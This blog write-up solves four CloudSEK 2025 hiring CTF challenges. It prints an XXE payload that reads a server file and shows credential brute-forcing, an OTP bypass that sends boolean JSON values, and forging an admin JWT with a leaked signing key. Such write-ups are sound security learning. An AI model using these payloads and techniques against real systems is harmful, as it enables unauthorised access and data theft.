---
title: "CloudSEK 2025 Hiring CTF Round 1 Writeup"
date: 2025-12-15T00:00:00+00:00
category: CTF
tags: ["ctf", "cloudsek"]
description: "Writeup for CloudSEK 2025 Hiring CTF Round 1 Challenges - Nitro, Bad Feedback, Triangle, Ticket"
toc: true
comments: true
---

## Introduction

This is my writeup for the CloudSEK Hiring CTF Round 1, which consisted of four challenges: **Nitro**, **Bad Feedback**, **Triangle**, and **Ticket**. Each challenge tested different aspects of web and mobile security, including automation, XXE, brute‑forcing, and JWT manipulation.

---

## Nitro
![alt text](/assets/img/posts/CloudSek%20Round1/Nitro.png){: style="display:block; margin-left:auto; margin-right:auto; width:80%;" }
### Objective

Automate a timed challenge where `/task` returns a random 12‑character alphanumeric string in HTML. The goal is to:

1. Reverse the string.
2. Base64‑encode it.
3. Wrap it as `CSK__{b64}__2025`.
4. POST to `/submit` with the same session cookies before the timer expires.

Manual attempts fail due to strict timing, so automation is required.

### Solution

1. Send a GET request to `/task` and extract the 12‑character token from the HTML response.
2. Reverse the token and Base64‑encode it.
3. Format the payload as `CSK__{b64}__2025`.
4. Immediately POST to `/submit` with the same session cookies.
5. Repeat until the flag is received.

### Python Code

```python
import requests, re, base64

BASE = "http://15.206.47.5:9090"
s = requests.Session()

while True:
    r = s.get(BASE + "/task")
    token = max(re.findall(r"[A-Za-z0-9]+", r.text), key=len)
    rev = token[::-1]
    payload = "CSK__" + base64.b64encode(rev.encode()).decode() + "__2025"

    r2 = s.post(
        BASE + "/submit",
        data=payload,
        headers={"Content-Type": "text/plain"}
    )

    print(r2.text)
    if not re.search(r"too slow|incorrect|no active task", r2.text, re.I):
        break
```
### Flag
![](/assets/img/posts/CloudSek%20Round1/Nitro_flag.png)

## Bad Feedback
![](/assets/img/posts/CloudSek%20Round1/BadFeedback.png){: style="display:block; margin-left:auto; margin-right:auto; width:80%;" }
### Objective

Exploit an XML‑based feedback form to read the flag file from the server using XXE.

### Solution

1. Open the challenge URL and locate the feedback form with **Name** and **Message** fields.
2. Submit random values and intercept the outgoing HTTP request using Burp Suite.
3. Observe that the data is sent as XML in the POST body, with tags like `<name>` and `<message>`.

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <feedback>
        <name>
            john
        </name>
        <message>
            adman
        </message>
    </feedback>
    ```

4. Replace the XML body with a crafted XXE payload that defines an external entity pointing to `/flag.txt`:

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
    <feedback>
        <name>
            &xxe;
        </name>
    </feedback>
    ```

5. Forward the modified request and check the HTTP response. The server parses the XML and reflects the content of `/flag.txt` in the response.

    ![](/assets/img/posts/CloudSek%20Round1/BadFeedback_Flag.png){: style="display:block; margin-left:auto; margin-right:auto; width:60%;" }

## Triangle
![](/assets/img/posts/CloudSek%20Round1/Triangle.png){: style="display:block; margin-left:auto; margin-right:auto; width:80%;" }
### Objective

Bypass a login form with username, password, and three OTP fields by manipulating the JSON request structure.

### Solution

1. Open the login page; the form has fields: `username`, `password`, `otp1`, `otp2`, `otp3`.
2. Submit a random username and capture the request in Burp. The server responds with “username wrong”.
3. Use Burp Intruder to brute‑force the `username` parameter with a common username wordlist (e.g., `admin`, `test`, `user`). A valid username is found: `admin`.
4. With `username=admin`, repeat the process for the `password` field and discover that the correct password is also `admin`.
5. Brute‑forcing the OTP fields is impractical due to their large size, so instead focus on the JSON POST body.
6. Modify the JSON to send `otp1`, `otp2`, and `otp3` as boolean `true` values:

    ```json
    {
        "username": "admin",
        "password": "admin",
        "otp1": true,
        "otp2": true,
        "otp3": true
    }
    ```

7. Forward the modified request. The server accepts the request and returns the flag:

    ```json
    {
        "message": "Flag: CL0uDsEk_ReSeArCH_tEaM_CTF_2025{474a30a63ef1f14e252dc0922f811b16}",
        "data": null
    }
    ```

## Ticket
![](/assets/img/posts/CloudSek%20Round1/Ticket.png){: style="display:block; margin-left:auto; margin-right:auto; width:80%;" }
### Objective

Exploit a mobile app’s exposed secrets in BeVigil to gain admin access via JWT manipulation.

### Solution

1. Open the BeVigil report for the given Android app and review exposed resources, especially `strings.xml`.
2. In `strings.xml`, note the following hardcoded values:
    - `base_url`: `http://15.206.47.5.nip.io:8443/`
    - `encoded_jwt_secret`: `c3RyIWszYjRua0AxMDA5JXN1cDNyIXMzY3IzNw==`
    - `internal_username`: `tuhin1729`
    - `internal_password`: `123456`
3. Base64‑decode `encoded_jwt_secret` to get the JWT signing key: `str!k3b4nk@1009%sup3r!s3cr37`.
4. Browse to `http://15.206.47.5.nip.io:8443/`, open the Employee Login Portal, and log in with:
    - Username: `tuhin1729`
    - Password: `123456`
5. Extract the JWT from the browser (cookie, header, or localStorage). The JWT uses HS256 with payload:

    ```
    {"username": "tuhin1729", "exp": 1765019251}
    ```

6. Use a JWT manipulation tool (e.g., jwt.io or a script) to:
    - Change the `username` claim from `tuhin1729` to `admin`.
    - Optionally update the `exp` timestamp if needed.
    - Re‑sign the token with the key `str!k3b4nk@1009%sup3r!s3cr37`.

    ![](/assets/img/posts/CloudSek%20Round1/Ticket_token.png){: style="display:block; margin-left:auto; margin-right:auto; width:80%;" }

7. Replace the original JWT in the browser with the forged admin token and refresh the page. The application now treats the user as admin and returns the flag.

    ![](/assets/img/posts/CloudSek%20Round1/Ticket_Flag.png){: style="display:block; margin-left:auto; margin-right:auto; width:80%;" }

## Conclusion

This CTF round covered a nice mix of practical security skills:

- **Nitro**: Automation and timing‑based challenges.
- **Bad Feedback**: Classic XXE to read local files.
- **Triangle**: Parameter manipulation and bypassing OTP checks via JSON.
- **Ticket**: Mobile app recon (BeVigil) and JWT token forgery.

These challenges reinforce the importance of understanding how applications process input, how secrets can leak in mobile apps, and how to automate repetitive tasks in CTFs.

If you enjoyed this writeup, stay tuned for more CTF solutions and security deep dives!